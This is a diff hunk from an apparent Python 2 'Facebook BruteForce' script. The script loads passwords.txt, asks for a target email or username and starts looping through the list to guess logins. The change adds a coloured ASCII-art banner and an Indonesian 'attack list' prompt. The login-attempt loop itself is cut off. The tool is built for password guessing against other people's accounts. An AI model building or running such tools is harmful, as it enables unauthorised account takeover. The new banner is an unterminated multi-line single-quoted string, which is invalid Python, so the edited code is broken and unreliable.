@@ -24,13 +24,20 @@ except:
 	print('\n\tPlease install mechanize.\n')
 	sys.exit()
 
-print('\n---------- Welcome To Facebook BruteForce ----------\n')
+print('
+   \033[31;1m=/\                 /\=
+   \033[31;1m/ \'._   (\_/)   _.'/ \
+  \033[31;1m/ .''._'--(o.o)--'_.''. \
+ \033[31;1m/.' _/ |`'=/ " \='`| \_ `.\
+\033[31;1m/` .' `\;-,'\___/',-;/` '. '\
+\033[31;/.-'        `\(-V-)/`       `-.\
+`             "   "            " "')
 file=open('passwords.txt','r')
 
 email=str(raw_input('Enter Email/Username : ').strip())
 
-print "\nTarget Email ID : ",email
-print "\nTrying Passwords from list ..."
+print "\nTarget ID/NO : ",email
+print "\nMENCOBAH KE AMANA AKUN/ATTACK LIST ..."
 
 i=0
 while file:
